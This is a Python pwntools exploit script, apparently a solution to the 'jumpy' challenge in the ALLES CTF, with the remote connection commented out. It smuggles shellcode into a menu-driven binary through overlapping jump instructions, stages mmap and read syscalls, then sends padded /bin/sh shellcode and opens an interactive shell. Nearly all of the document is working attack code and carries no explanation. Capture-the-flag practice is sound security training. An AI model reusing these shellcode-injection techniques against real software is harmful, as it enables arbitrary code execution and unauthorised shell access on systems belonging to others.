from pwn import *

context.log_level=logging.INFO
context.arch='amd64'
io = process('./jumpy')
# io = remote('7b00000082f898b0f5bf8386-jumpy.challenge.master.allesctf.net', 31337, ssl=True)

def write_shellcode(shellcode):
    io.sendlineafter('>', 'jmp')
    io.sendline('1')
    io.sendlineafter('>', 'moveax')
    io.sendline('1003')              # \xeb\x03 jmp 0x5
    io.sendlineafter('>', 'moveax')
    print(shellcode)
    io.sendline(str(shellcode))


shellcode = 'push rax; pop rsi; push rdi; pop rax;'
print(asm(shellcode))
shellcode = u32(asm(shellcode))
write_shellcode(shellcode)

shellcode = 'push rax; shl rax, 1;'
print(len(asm(shellcode)))
shellcode = u32(asm(shellcode))
write_shellcode(shellcode)

shellcode = 'push rcx; pop rdi; push rdx; pop rdx;'
print(len(asm(shellcode)))
shellcode = u32(asm(shellcode))
write_shellcode(shellcode)

shellcode = 'inc rsi; push rsi;'
print(len(asm(shellcode)))
shellcode = u32(asm(shellcode))
write_shellcode(shellcode)

shellcode = 'shl rsi, 12;'
print(len(asm(shellcode)))
shellcode = u32(asm(shellcode))
write_shellcode(shellcode)

shellcode = 'add rdx, 7;'
print(len(asm(shellcode)))
shellcode = u32(asm(shellcode))
write_shellcode(shellcode)

shellcode = 'syscall; push rdi; pop rsi;'
print(len(asm(shellcode)))
shellcode = u32(asm(shellcode))
write_shellcode(shellcode)

shellcode = 'push rax; pop rdi; push r11;'
print(len(asm(shellcode)))
shellcode = u32(asm(shellcode))
write_shellcode(shellcode)

shellcode = 'shl rdx, 5;'
print(len(asm(shellcode)))
shellcode = u32(asm(shellcode))
write_shellcode(shellcode)

shellcode = 'syscall; push rdx; push rdx;'
print(len(asm(shellcode)))
shellcode = u32(asm(shellcode))
write_shellcode(shellcode)

# gdb.attach(io)
io.sendline("r")
# pause()

shellcode = asm(shellcraft.sh())
payload = b'a' * 0x76 + shellcode
io.send(payload)
io.interactive()
